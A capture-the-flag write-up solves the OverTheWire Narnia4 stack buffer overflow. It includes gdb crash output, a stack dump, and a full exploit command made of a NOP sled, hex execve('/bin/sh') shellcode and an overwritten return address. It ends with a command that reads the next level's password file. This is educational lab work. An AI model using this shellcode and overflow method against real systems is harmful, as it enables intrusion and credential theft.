This is another buffer overflow vulnerability straight away I had planned to use the same method of passing the binary my shellcode as I did in the Narnia2 challenge, when I re-read through the source code I realised this was the only way the shellcode can be passed to the binary anyways as it is set to null. So I opened up gdb and began debugging the binary sending it increasing in length strings beginning at 260 until I caused a SIGSEV error.

```
(gdb) r $(python -c'print "A"*276')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: /games/narnia/narnia4 $(python -c'print "A"*276')
 
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/250x $esp
0xffffd620:     0x00000000      0xffffd6b4      0xffffd6c0      0xf7fd3000
0xffffd630:     0x00000000      0xffffd61c      0xffffd6c0      0x00000000
0xffffd640:     0x0804824c      0xf7fceff4      0x00000000      0x00000000
0xffffd650:     0x00000000      0x2cd80063      0x1bdca473      0x00000000
0xffffd660:     0x00000000      0x00000000      0x00000002      0x08048390
0xffffd670:     0x00000000      0xf7ff0a90      0xf7e453c9      0xf7ffcff4
0xffffd680:     0x00000002      0x08048390      0x00000000      0x080483b1
0xffffd690:     0x08048444      0x00000002      0xffffd6b4      0x08048500
0xffffd6a0:     0x08048570      0xf7feb660      0xffffd6ac      0xf7ffd918
0xffffd6b0:     0x00000002      0xffffd7d5      0xffffd7eb      0x00000000
0xffffd6c0:     0xffffd900      0xffffd910      0xffffd91b      0xffffd93f
0xffffd6d0:     0xffffd952      0xffffd95b      0xffffd968      0xffffde89
0xffffd6e0:     0xffffde94      0xffffde9f      0xffffdeec      0xffffdf03
0xffffd6f0:     0xffffdf12      0xffffdf24      0xffffdf35      0xffffdf3e
0xffffd700:     0xffffdf51      0xffffdf59      0xffffdf69      0xffffdfa0
0xffffd710:     0xffffdfc0      0x00000000      0x00000020      0xf7fdb420
0xffffd720:     0x00000021      0xf7fdb000      0x00000010      0x1f898975
0xffffd730:     0x00000006      0x00001000      0x00000011      0x00000064
0xffffd740:     0x00000003      0x08048034      0x00000004      0x00000020
0xffffd750:     0x00000005      0x00000008      0x00000007      0xf7fdc000
0xffffd760:     0x00000008      0x00000000      0x00000009      0x08048390
0xffffd770:     0x0000000b      0x000036b4      0x0000000c      0x000036b4
0xffffd780:     0x0000000d      0x000036b4      0x0000000e      0x000036b4
0xffffd790:     0x00000017      0x00000000      0x00000019      0xffffd7bb
0xffffd7a0:     0x0000001f      0xffffdfe2      0x0000000f      0xffffd7cb
0xffffd7b0:     0x00000000      0x00000000      0xf1000000      0x206ad5f0
0xffffd7c0:     0xe7ce69ba      0x3bf6e642      0x69a79926      0x00363836
0xffffd7d0:     0x00000000      0x61672f00      0x2f73656d      0x6e72616e
0xffffd7e0:     0x6e2f6169      0x696e7261      0x41003461      0x41414141
0xffffd7f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd800:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd810:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd820:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd830:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd840:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd850:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd860:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd870:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd880:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd890:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd8a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd8b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd8c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd8d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd8e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd8f0:     0x41414141      0x41414141      0x41414141      0x00414141
0xffffd900:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd910:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd920:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd930:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd940:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd950:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd960:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd970:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd980:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd990:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd9a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd9b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd9c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd9d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd9e0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd9f0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffda00:     0x00000000      0x00000000
```
So for this buffer overflow vulnerability I have 272 bytes for my payload with the last 4 bytes to make the total payload length of 276 for my RET address. Looking in the above debugging of the stack of the binary file I can see the payload is sitting between the memory address range of “0xffffd7dc-0xffffd8fc”, I chose the location of “0xffffd810” as my RET address as it was close to the start of my buffer that I sent.

```
root@Phlegethon:~/Study/overthewire/narnia# python -c'print(len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"))'
25
```

So next I just used python to create my buffer string with the first 247 bytes of the buffer will by my NOP sled and then my 25 byte shellcode and then the 4 byte RET address which will overwrite the EIP register and jump into my NOP sled of my buffer.

```
narnia4@melinda:~$ /games/narnia/narnia4 $(python -c'print "\x90"*247 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x10\xd8\xff\xff"')
$ cat /etc/narnia_pass/narnia5
```
